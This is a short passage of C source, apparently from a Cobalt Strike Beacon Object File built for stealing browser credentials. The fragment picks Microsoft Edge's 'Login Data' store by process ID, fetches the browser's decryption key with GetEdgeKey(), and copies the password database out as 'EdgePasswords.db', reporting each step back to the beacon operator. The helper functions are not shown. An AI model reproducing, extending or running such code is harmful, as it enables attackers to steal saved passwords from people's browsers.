    else if (edgeLoginDataPID == 0){
        BeaconPrintf(CALLBACK_OUTPUT, "EDGE Login Data SELECTED");
        BeaconPrintf(CALLBACK_OUTPUT, "PID: %d", pid);
        GetEdgeKey();
        GetBrowserFile(pid, "Login Data", "EdgePasswords.db");
        return;
    }
    else{
        BeaconPrintf(CALLBACK_ERROR,"NOTHING SELECTED");
        return;
    }
}
